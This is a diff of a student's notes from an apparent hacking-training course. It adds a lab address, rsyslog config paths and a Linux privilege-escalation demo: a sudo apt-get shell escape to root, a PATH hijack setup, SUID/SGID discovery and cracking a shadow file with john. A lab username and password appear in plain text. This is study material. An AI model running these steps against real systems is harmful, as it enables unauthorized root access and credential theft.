@@ -1,5 +1,6 @@
 GRRG-503-M
 9GbRCKc43SzluEG
+10.50.20.250:8000
 10.50.39.165
 student:9GbRCKc43SzluEG
 !! Why do they not post the Student Facilitation Guide the day before class, the first day has too much information too fast and it is stressful. It would be less stressful if they just released the FG
@@ -537,9 +538,53 @@ Common Places to look for Persistence
   HKLM\Software\Microsoft\Windows\CurrentVersion\Run or RunOnce
   HKCU\Software\Microsoft\Windows\CurrentVersion\Run or RunOnce
   Scheduled Tasks and Services
+  
 #############################################
 Privilege Escalation Activities :: Maintaining Persistence Activities :: Covering Tracks - Linux
 #############################################
+Places to look for Rsyslog
+/etc/rsyslog.d/*
+/etc/rsyslog.conf
+<facility>.<priority>      # rsyslog log file is set up like this
+
+--- DEMO ---
+1. sudo -l
+  /usr/bin/apt-get
+2. Look up GTFO bins
+  look up apt-get and click sudo   # this will give a way to elevate your privileges
+  copy the command
+3. run $PATH to see if /usr/bin is in the pathway
+4. run the command using sudo
+  sudo apt-get changelog apt
+    !/bin/bash    # enter this after you run the first command
+
+1. set a dot in the path
+  PATH=.:$PATH
+
+1. Find the files with the SUID bit set 
+  find / -type f -perm /4000 -ls 2>/dev/null
+2. Find the files with the SGID bit set
+  find / -type f -perm /2000 -ls 2>/dev/null
+3. Look up GTFO bins
+  start looking up all of the binaries with the suid or sgid bit set, until you get a hit with suid as an option
+
+john --wordlist=Wordlist.txt shadowfile
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
